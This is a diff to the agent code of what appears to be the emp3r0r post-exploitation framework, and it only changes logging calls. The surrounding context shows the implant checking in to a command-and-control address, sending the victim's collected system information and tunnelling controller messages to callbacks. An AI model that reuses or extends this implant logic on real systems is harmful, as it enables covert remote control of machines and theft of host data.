@@ -38,7 +38,7 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	// If empty, the checkin will fail with 404 because the URL will be incomplete (/api/checkin/),
 	// or the server will reject it. This is intended.
 	reportStatusURL := netutil.JoinURL(def.CCAddress, prefix, checkinPath, info.UUID)
-	logging.Printf("Collected system info, now reporting status (%s)", reportStatusURL)
+	logging.Infof("Collected system info, now reporting status (%s)", reportStatusURL)
 
 	conn, _, _, err := EstablishC2Connection(reportStatusURL)
 	if err != nil {
@@ -55,7 +55,7 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	out := cbor.NewEncoder(secureConn)
 	err = out.Encode(info)
 	if err == nil {
-		logging.Println("Checked in")
+		logging.Infof("Checked in")
 	}
 	return err
 }
@@ -76,7 +76,7 @@ func catchInterruptAndExit(ctx context.Context, cancel context.CancelFunc) {
 	signal.Notify(sig, os.Interrupt)
 	select {
 	case <-sig:
-		logging.Println("Cancelling due to interrupt")
+		logging.Infof("Cancelling due to interrupt")
 		cancel()
 		os.Exit(0)
 	case <-ctx.Done():
@@ -133,7 +133,7 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 		}()
 		// Track if we have already exchanged keys in this session
 		var pfsKeysExchanged bool
-		logging.Println("Check CC response: started")
+		logging.Infof("Check CC response: started")
 		for ctx.Err() == nil {
 			// read response
 			// all messages are now structured MsgTunData
@@ -189,7 +189,7 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 			msgCopy := msg
 			go callback(&msgCopy)
 		}
-		logging.Println("Check CC response: exited")
+		logging.Infof("Check CC response: exited")
 	}()
 
 	wait_hello := func(hello_id string) bool {
